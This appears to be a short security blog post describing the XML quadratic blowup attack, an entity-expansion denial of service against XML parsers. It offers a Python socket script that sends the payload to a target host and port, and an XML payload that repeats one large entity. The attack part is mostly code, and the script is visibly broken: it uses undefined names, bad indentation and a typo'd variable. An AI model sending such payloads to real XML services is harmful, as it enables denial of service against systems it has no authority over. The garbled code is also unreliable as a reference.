---
title: Quadratic Blowup Attack
tags: ["Web Attack", "Python", "Exploit", "Hack", "Web Exploit"]
date: 2017-12-04
cover: "/media/XMLExpquadratic.gif"
---

## Attack

An XML quadratic blowup attack is similar to a Billion Laughs attack. Essentially, it exploits the use of entity expansion. Instead of deferring to the use of nested entities, it replicates one large entity using a couple thousand characters repeatedly.
These attacks exists becasue applications often need to transform data in and out of the XML format by using an XML parser. It may be possible for an attacker to inject data that may have an adverse effect on the XML parser when it is being processed. These adverse effects may include the parser crashing, consuming too much of a resource, executing too slowly, executing code supplied by an attacker, allowing usage of unintended system functionality, etc. 


## Script

The following code can be used to send the payload to vulnerable application. For adding the SSL/TLS support import SSL lib and encapsulate plain socket in ssl socket using ssl.wrap_socket function(plainSocketHandle, ssl_version="").

```python
import socket,ssl

###########Code Snippet###########
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
addr = (sys.argv[1], int(sys.argv[2]))
    try:
        s.connect(addr)
        data = 'GET /rest/version HTTP/1.0\r\nContent-Type: application/xml\r\n\r\n' + exploit_PayloadGen()
        s.send(data)
        resp = ss.recv(1000)
        s.close()
        print("Attack Failed!!")
    except:
        time.sleep(1)
        if status == True:
            print("Attack Successful. XML application pawned!!!")
            status=False
###################################
```

#### Payload
```XML
<?xml version="1.0"?><!DOCTYPE payload [
<!ENTITY Aloo "AAAAAAAAAAAAAAAAAAA...">
]>
<payload>&Aloo;&Aloo;&Aloo;&Aloo;&Aloo;&Aloo;...</payload>

```
While forming payload the application XML schema plays a very important role. In order to automate the payload generation XSD files can be used to generate payload in proper schema structure which application under radar understands. 

## Exploit

![ Quadratic Blowup Attack GIF](/media/XMLExpquadratic.gif)


##### **References**:
1. [XML Attacks](http://capec.mitre.org/data/definitions/99.html)
2. [Billion Day Laugh](https://en.wikipedia.org/wiki/Billion_laughs_attack)
3. [GitHub](https://github.com/s4bu) 




